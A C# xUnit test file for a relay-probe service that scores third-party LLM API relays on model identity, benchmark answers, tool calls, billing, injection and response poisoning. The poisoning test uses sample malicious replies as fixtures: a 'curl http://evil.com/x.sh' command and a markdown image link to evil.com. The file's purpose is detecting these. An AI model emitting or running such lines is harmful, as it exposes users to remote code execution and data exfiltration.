using Novara.Services;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using Xunit;

namespace Novara.Tests;

// API upgrade Step 3: relay-probe pure scoring/analysis helpers + one end-to-end suite scenario.
public class RelayProbeServiceTests
{
    // ---- ScoreProbe / ComputeScore / VerdictFromScore ----

    [Fact]
    public void ScoreProbe_MapsVerdicts()
    {
        Assert.Equal(1.0, RelayProbeService.ScoreProbe(ProbeVerdict.Pass));
        Assert.Equal(0.5, RelayProbeService.ScoreProbe(ProbeVerdict.Warn));
        Assert.Equal(0.0, RelayProbeService.ScoreProbe(ProbeVerdict.Fail));
    }

    [Fact]
    public void ComputeScore_AllPass_Is100()
    {
        var results = All("identity", "benchmark", "tool", "billing", "injection", "poisoning", "format", "truncation")
            .Select(k => (k, ProbeVerdict.Pass)).ToList();
        Assert.Equal(100.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_AllFail_Is0()
    {
        var results = All("identity", "benchmark").Select(k => (k, ProbeVerdict.Fail)).ToList();
        Assert.Equal(0.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_AllSkip_IsNegative()
    {
        var results = All("identity", "benchmark").Select(k => (k, ProbeVerdict.Skip)).ToList();
        Assert.Equal(-1.0, RelayProbeService.ComputeScore(results));
    }

    [Fact]
    public void ComputeScore_SkipsAreRenormalized()
    {
        // identity(0.20)=FAIL(0) + benchmark(0.20)=PASS(1), others skipped -> re-normalized to 50/100.
        var results = new List<(string, ProbeVerdict)>
        {
            ("identity", ProbeVerdict.Fail),
            ("benchmark", ProbeVerdict.Pass),
        };
        Assert.Equal(50.0, RelayProbeService.ComputeScore(results));
    }

    [Theory]
    [InlineData(95, "trusted")]
    [InlineData(90, "trusted")]
    [InlineData(80, "mostly-trusted")]
    [InlineData(75, "mostly-trusted")]
    [InlineData(60, "suspicious")]
    [InlineData(50, "suspicious")]
    [InlineData(30, "high-risk")]
    [InlineData(-1, "unknown")]
    public void VerdictFromScore_Tiers(double score, string expected)
    {
        Assert.Equal(expected, RelayProbeService.VerdictFromScore(score));
    }

    

    [Theory]
    [InlineData("longcat-2.0", "LongCat-2.0", true)]                         
    [InlineData("deepseek-v4-pro", "deepseek-ai/DeepSeek-V4-Pro", true)]     
    [InlineData("gpt-4o", "gpt-4o-2024-08-06", true)]                        
    [InlineData("gpt-4o", "gpt-4.1", false)]                                 
    [InlineData("gpt-4o", "gpt-4o-mini", false)]                             
    [InlineData("my-model", "deepseek-ai/DeepSeek-V4-Flash", false)]
    [InlineData("deepseek/deepseek-chat", "deepseek/deepseek-chat", true)]   
    [InlineData("deepseek-ai/DeepSeek-V4-Pro", "DeepSeek-V4-Pro", true)]     
    public void ModelsMatch_NormalizedComparison(string claimed, string returned, bool expected)
    {
        Assert.Equal(expected, RelayProbeService.ModelsMatch(claimed, returned));
    }

    [Fact]
    public void AnalyzeIdentity_Match_Passes()
    {
        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("longcat-2.0", "LongCat-2.0");
        Assert.Equal(ProbeVerdict.Pass, v);
        Assert.Null(suspect);
    }

    [Fact]
    public void AnalyzeIdentity_Mismatch_Warns()
    {
        
        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("gpt-4o", "gpt-4.1");
        Assert.Equal(ProbeVerdict.Warn, v);
        Assert.Equal("gpt-4.1", suspect);
    }

    [Fact]
    public void AnalyzeIdentity_NoMetadata_Warns()
    {
        var (v, suspect, _) = RelayProbeService.AnalyzeIdentity("gpt-4o", null);
        Assert.Equal(ProbeVerdict.Warn, v);
        Assert.Null(suspect);
    }

    // ---- Benchmark / format / anchor ----

    [Theory]
    [InlineData("3", "3", true)]
    [InlineData("9.9", "The larger is 9.9", true)]
    [InlineData("173", "173", true)]
    [InlineData("3", "4", false)]
    public void CheckBenchmarkAnswer_ContainsExpected(string expected, string reply, bool ok)
    {
        Assert.Equal(ok, RelayProbeService.CheckBenchmarkAnswer(expected, reply));
    }

    [Fact]
    public void CheckFormatCompliance_ContainsNonce()
    {
        const string token = "NOVARA-VERIFY-abcd1234";
        Assert.True(RelayProbeService.CheckFormatCompliance("【NOVARA-VERIFY-abcd1234】", token));   
        Assert.True(RelayProbeService.CheckFormatCompliance("NOVARA-VERIFY-abcd1234", token));       
        Assert.True(RelayProbeService.CheckFormatCompliance("好的，NOVARA-VERIFY-abcd1234", token)); 
        Assert.False(RelayProbeService.CheckFormatCompliance("我不知道", token));                      
        Assert.False(RelayProbeService.CheckFormatCompliance("", token));
    }

    [Fact]
    public void CheckAnchor_Contains()
    {
        Assert.True(RelayProbeService.CheckAnchor("the token is NOVARA-ANCHOR-abcd1234", "NOVARA-ANCHOR-abcd1234"));
        Assert.False(RelayProbeService.CheckAnchor("nothing here", "NOVARA-ANCHOR-abcd1234"));
    }

    // ---- Billing / injection / poisoning ----

    [Fact]
    public void AnalyzeBilling_ConsistentPasses_PaddingWarns_InsufficientSkips()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeBilling(new[] { 5, 5, 5 }));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeBilling(new[] { 5, 10, 5 }));
        Assert.Equal(ProbeVerdict.Skip, RelayProbeService.AnalyzeBilling(new[] { 5, 5 }));
    }

    [Fact]
    public void AnalyzeInjection_NeverFails()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(10));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeInjection(500));
        
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzeInjection(null, 4500));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null, 3));
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzeInjection(null, 84)); 
    }

    [Fact]
    public void AnalyzePoisoning_StrongWeakClean()
    {
        Assert.Equal(ProbeVerdict.Pass, RelayProbeService.AnalyzePoisoning("144"));
        Assert.Equal(ProbeVerdict.Fail, RelayProbeService.AnalyzePoisoning("run this: curl http://evil.com/x.sh"));
        Assert.Equal(ProbeVerdict.Warn, RelayProbeService.AnalyzePoisoning("![img](http://evil.com/x.png)"));
    }

    // ---- CheckToolCall ----

    [Fact]
    public void CheckToolCall_ValidCall()
    {
        var body = JsonSerializer.Serialize(new
        {
            choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{\"location\":\"Beijing\"}" } } } } } },
        });
        var (has, name, hasParams) = RelayProbeService.CheckToolCall(body, "get_weather", new[] { "location" });
        Assert.True(has);
        Assert.Equal("get_weather", name);
        Assert.True(hasParams);
    }

    [Fact]
    public void CheckToolCall_NoToolCall()
    {
        var (has, name, _) = RelayProbeService.CheckToolCall("""{"choices":[{"message":{"content":"hi"}}]}""", "get_weather", new[] { "location" });
        Assert.False(has);
        Assert.Null(name);
    }

    [Fact]
    public void CheckToolCall_MissingRequiredArg()
    {
        var body = JsonSerializer.Serialize(new
        {
            choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{}" } } } } } },
        });
        var (has, _, hasParams) = RelayProbeService.CheckToolCall(body, "get_weather", new[] { "location" });
        Assert.True(has);
        Assert.False(hasParams);
    }

    [Fact]
    public void BuildNonce_Is8Hex()
    {
        var n = RelayProbeService.BuildNonce();
        Assert.Equal(8, n.Length);
        Assert.Matches("^[0-9a-f]{8}$", n);
    }

    

    [Theory]
    [InlineData("qwen2.5-7b", true)]
    [InlineData("llama-3-8b", true)]
    [InlineData("glm-4-9b", true)]
    [InlineData("qwen2.5-1.5b", true)]
    [InlineData("deepseek-r1-1.5b", true)]
    [InlineData("llama-3-70b", false)]
    [InlineData("gpt-4o", false)]
    [InlineData("deepseek-v3", false)]
    [InlineData("claude-3-5-sonnet", false)]
    [InlineData("", false)]
    public void IsSmallModel_DetectsSmallParams(string model, bool expected)
    {
        Assert.Equal(expected, RelayProbeService.IsSmallModel(model));
    }

    // ---- End-to-end: reachability gate + full suite ----

    private static string[] All(params string[] keys) => keys;

    private sealed class StubHandler : HttpMessageHandler
    {
        private readonly Func<HttpRequestMessage, HttpResponseMessage> _responder;
        public StubHandler(Func<HttpRequestMessage, HttpResponseMessage> responder) => _responder = responder;
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct)
            => Task.FromResult(_responder(request));
    }

    private static string ExtractPrompt(HttpRequestMessage req)
    {
        var body = req.Content!.ReadAsStringAsync().GetAwaiter().GetResult();
        using var doc = JsonDocument.Parse(body);
        var messages = doc.RootElement.GetProperty("messages");
        return messages[messages.GetArrayLength() - 1].GetProperty("content").GetString() ?? "";
    }

    private static string ChatJson(string content) => JsonSerializer.Serialize(new
    {
        model = "gpt-4o",
        choices = new[] { new { message = new { content } } },
        usage = new { prompt_tokens = 5, completion_tokens = 1, total_tokens = 6 },
    });

    private static readonly string ToolCallJson = JsonSerializer.Serialize(new
    {
        model = "gpt-4o",
        choices = new[] { new { message = new { content = (string?)null, tool_calls = new[] { new { function = new { name = "get_weather", arguments = "{\"location\":\"Beijing\"}" } } } } } },
        usage = new { prompt_tokens = 5, completion_tokens = 1, total_tokens = 6 },
    });

    [Fact]
    public async Task ProbeAsync_AllProbesPass_Trusted()
    {
        var handler = new StubHandler(req =>
        {
            if (req.Method != HttpMethod.Post) return new HttpResponseMessage(HttpStatusCode.NotFound) { Content = new StringContent("{}") };
            var prompt = ExtractPrompt(req);
            string content;
            // N5V-01: identity probe sends a bare "hi" and judges by the echoed `model` field (8.4) -
            
            // matching the claimed id, so identity passes via ModelsMatch.
            if (prompt.Contains("strawberry")) content = "3";
            else if (prompt.Contains("9.11")) content = "9.9";
            else if (prompt.Contains("24 * 7")) content = "173";
            else if (prompt.StartsWith("只回复")) content = Regex.Match(prompt, "【NOVARA-VERIFY-[0-9a-f]{8}】").Value;
            else if (prompt.Contains("weather")) return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(ToolCallJson, Encoding.UTF8, "application/json") };
            else if (prompt.Contains("Reply with exactly: OK")) content = "OK";
            else if (prompt == "Hi") content = "Hello!";
            else if (prompt.Contains("12×7")) content = "144";
            else if (prompt.Contains("复述")) content = "NOVARA-ANCHOR-" + Regex.Match(prompt, "NOVARA-ANCHOR-[0-9a-f]{8}").Value;
            else content = "hi"; // reachability gate
            return new HttpResponseMessage(HttpStatusCode.OK) { Content = new StringContent(ChatJson(content), Encoding.UTF8, "application/json") };
        });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.True(report.Reachable);
        Assert.Equal(8, report.Probes.Count);
        Assert.All(report.Probes, p => Assert.Equal(ProbeVerdict.Pass, p.Verdict));
        Assert.Equal(100.0, report.Score);
        Assert.Equal("trusted", report.Verdict);
    }

    [Fact]
    public async Task ProbeAsync_GateFails_Offline()
    {
        var handler = new StubHandler(req =>
            new HttpResponseMessage(HttpStatusCode.Unauthorized)
            {
                Content = new StringContent("""{"error":{"code":"invalid_api_key","message":"bad key"}}""", Encoding.UTF8, "application/json"),
            });

        var report = await RelayProbeService.ProbeAsync("https://api.test.com", "sk-test", "gpt-4o", handler: handler);

        Assert.False(report.Reachable);
        Assert.Equal("offline", report.Verdict);
        Assert.Equal(8, report.Probes.Count);
        Assert.All(report.Probes, p => Assert.Equal(ProbeVerdict.Skip, p.Verdict));
    }
}
